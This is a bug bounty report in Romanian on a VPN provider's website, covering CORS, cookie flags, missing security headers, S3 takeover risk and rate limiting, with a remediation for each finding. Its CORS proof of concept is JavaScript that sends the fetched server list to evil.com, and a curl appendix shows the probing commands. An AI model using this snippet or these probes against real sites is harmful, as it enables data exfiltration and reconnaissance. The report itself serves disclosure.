# Bug Bounty Report — CyberGhost VPN

**Researcher:** [Nume tău]
**Date:** 2026-07-13
**Program:** Bugcrowd — CyberGhost
**Scope:** `*.cyberghostvpn.com`, `*.cyberghost.com`, `api.cyberghostvpn.com`

---

## Rezumat

Am identificat **3 vulnerabilități** și **4 probleme de securitate** în infrastructura web CyberGhost, prin tehnici pasive (curl, fără scanări automate). Cele mai critice sunt: expunerea infrastructurii VPN via CORS wildcard și cookie-uri de sesiune fără protecție.

---

## 🔴 Vulnerabilitate 1: CORS Wildcard pe `/getservers` + expunere infrastructură VPN

**Severitate:** High  
**Endpoint:** `GET https://www.cyberghostvpn.com/getservers`  
**Headere răspuns:**
```
access-control-allow-origin: *
access-control-allow-methods: GET,POST,OPTIONS,DELETE,PUT
content-type: text/html; charset=UTF-8
```

**Descriere:** Endpoint-ul `/getservers` returnează lista completă a serverelor VPN CyberGhost (IP-uri, coordonate GPS, încărcare utilizatori, capacitate maximă) și are `Access-Control-Allow-Origin: *`. Orice site web malitios poate citi aceste date via JavaScript.

**Date expuse per server:**
- IP public
- Coordonate GPS (latitudine, longitudine)
- Încărcare curentă utilizatori
- Capacitate maximă
- Tip server (streaming, downloading, surfing)
- Ping

**POC:**
```html
<script>
fetch('https://www.cyberghostvpn.com/getservers')
  .then(r => r.json())
  .then(data => {
    // Exfiltrare date către serverul atacatorului
    fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) });
  });
</script>
```

**Impact:** Un atacator poate:
1. Construi o hartă exactă a infrastructurii VPN
2. Identifica serverele cu încărcare mică (ținte ușoare)
3. Targeta IP-uri specifice pentru DDoS
4. Profita de servere cu capacitate mare pentru abuz

**Remediere:**
- Restrânge CORS la originile oficiale (`https://www.cyberghostvpn.com`, extensiile Chrome/Firefox)
- Adaugă autentificare pe endpoint (măcar token simplu per sesiune)
- Schimbă `Content-Type` la `application/json`

---

## 🔴 Vulnerabilitate 2: Cookie-uri de sesiune fără `HttpOnly` și `Secure`

**Severitate:** High  
**Endpoint:** `GET https://www.cyberghostvpn.com/` (orice pagină)

**Descriere:** Multiple cookie-uri sunt setate fără flag-urile `HttpOnly` și `Secure`, inclusiv `browser_session` care pare a fi un identificator de sesiune.

**Cookie-uri vulnerabile:**

| Cookie | HttpOnly | Secure | SameSite | Expiry |
|--------|----------|--------|----------|--------|
| `browser_session` | ❌ | ❌ | — | 1 an |
| `cg_initial_media_source` | ❌ | ❌ | — | 30 zile |
| `cg_media_source` | ❌ | ❌ | — | 30 zile |
| `cg_assisting_media` | ❌ | ❌ | — | 30 zile |
| `cg_campaign` | ❌ | ❌ | — | 30 zile |
| `cg_clickid` | ❌ | ❌ | — | 30 zile |
| `cg_di` | ❌ | ✅ | — | 30 zile |
| `cg_lp` | ❌ | ✅ | — | 30 zile |

**Impact:** Dacă un atacator găsește un XSS (chiar și pe un subdomeniu), poate fura `browser_session` și prelua sesiunea utilizatorului. Cookie-urile de marketing (`cg_*`) pot fi folosite pentru fingerprinting și tracking.

**Remediere:**
- Adaugă `HttpOnly; Secure; SameSite=Lax` pe TOATE cookie-urile
- Pentru `browser_session` — criptează valoarea sau folosește un JWT securizat

---

## 🟡 Vulnerabilitate 3: Security headers inconsistente — lipsă pe răspunsul final

**Severitate:** Medium  
**Endpoint:** `GET https://www.cyberghostvpn.com/` (răspuns final)

**Descriere:** Header-ele de securitate sunt prezente pe răspunsul de redirect al API-ului (`api.cyberghostvpn.com` → 302) dar **dispar complet** pe răspunsul final (`www.cyberghostvpn.com` → 200).

**Comparație:**

| Header | api.cyberghostvpn.com (302) | www.cyberghostvpn.com (200) |
|--------|---------------------------|-----------------------------|
| `Strict-Transport-Security` | ✅ `max-age=31536000; includeSubdomains; preload` | ❌ Lipsă |
| `Content-Security-Policy` | ✅ `default-src 'self'; ...` | ❌ Lipsă |
| `X-Content-Type-Options` | ✅ `nosniff` | ❌ Lipsă |
| `Referrer-Policy` | ✅ `strict-origin` | ❌ Lipsă |
| `X-Frame-Options` | ❌ | ✅ `SAMEORIGIN` |
| `X-XSS-Protection` | ✅ `1; mode=block` | ❌ Lipsă |

**Impact:**
- Fără HSTS → utilizatorii pot fi downgradați la HTTP prin MITM
- Fără CSP → potențial XSS (nu e blocat la nivel de browser)
- Fără nosniff → browserul poate interpreta greșit tipul MIME
- `X-Frame-Options: SAMEORIGIN` → periculos pentru un site VPN (clickjacking via subdomenii)

**Remediere:**
- Aplică aceleași headere de securitate pe răspunsul final (200) ca pe cel de redirect
- Schimbă `X-Frame-Options` la `DENY`
- Activează HSTS preload

---

## 🟡 Găsire 4: S3 bucket identificabil — potențial takeover

**Severitate:** Medium (potențial)  
**Endpoint:** `https://assets.cyberghostvpn.com/`

**Descriere:** Subdomeniul `assets.cyberghostvpn.com` este un bucket AWS S3 în `eu-west-1`. Expune headere S3:

```
x-amz-bucket-region: eu-west-1
x-amz-request-id: XD5077Z6ZG409Y92
```

Bucket-ul nu e listabil public (`AccessDenied`), dar existența lui e confirmată. Dacă bucket-ul e șters vreodată și CNAME-ul rămâne, e posibil un **subdomain takeover**.

**Remediere:**
- Monitorizează DNS pentru CNAME-uri către resurse AWS care nu mai există
- Adaugă验证 TXT record pentru verificarea proprietății bucket-ului

---

## 🟡 Găsire 5: Rate limiting pare absent

**Severitate:** Medium  
**Endpoint:** `POST https://www.cyberghostvpn.com/shop/login` (și altele)

**Descriere:** Endpoint-urile protejate (403) răspund instantaneu la orice număr de requesturi, fără întârziere progresivă. Rate limiting-ul e gestionat doar de Cloudflare, nu la nivel de aplicație.

**Test:** 5 requesturi consecutive la `/shop/login` — toate returnate în < 1 secundă, toate 403.

**Impact:** Brute-force atacuri (deși rate limit-ul Cloudflare oferă protecție parțială).

---

## 🟢 Găsire 6: Information disclosure prin headers

**Severitate:** Low  
**Endpoint:** `GET https://www.cyberghostvpn.com/`

**Descriere:**
- `x-powered-by: CG` — dezvăluie tehnologia
- `content-type: text/html` pe `/getservers` în loc de `application/json`
- `robots.txt` dezvăluie endpoint-uri interne
- `sitemap.xml` → 404 (dar dezvăluie 17 limbi și subdomeniul assets)

---

## Anexă: Comenzi curl folosite

```bash
# Headere securitate
curl -sI https://www.cyberghostvpn.com/

# /getservers
curl -sL https://www.cyberghostvpn.com/getservers | jq .

# CORS test
curl -sI -H "Origin: https://evil.com" https://www.cyberghostvpn.com/getservers

# Cookie analysis
curl -sI https://www.cyberghostvpn.com/shop/login | grep -i "set-cookie"
```

---

*Report generat prin testare manuală, fără scanări automate, fără DoS.*
